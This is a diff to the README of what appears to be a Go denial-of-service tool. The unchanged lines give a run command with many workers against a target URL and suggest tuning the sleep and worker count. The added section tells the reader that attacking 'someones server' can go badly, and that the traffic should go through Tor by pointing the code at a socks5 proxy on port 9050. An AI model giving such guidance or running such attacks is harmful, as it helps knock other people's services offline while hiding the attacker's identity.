@@ -49,6 +49,16 @@ Denial Of Service attack in GO using TOR
 	  go run ddos.go -workers=200 -url=http://somekejfjejf4chan.kjd:80 (no of worker in default set to 100)
 	  
 	  If you want to dive into the  code just change the time.sleep(1 *time.Second) and amount of workers just play around 😊
+	  
+	  
+     *  Did we forget something ?
+         
+	  consider you play around the code into someones server the situation may be worse its a good practice to establish a tor connection
+	  
+	  first ensure that tor is running in your system and note the port number normally tor runs in 9050 and change the code
+	  torcon, _ :=        url.Parse("socks5://127.0.0.1:9050")
+	  
+	  
 
     
 
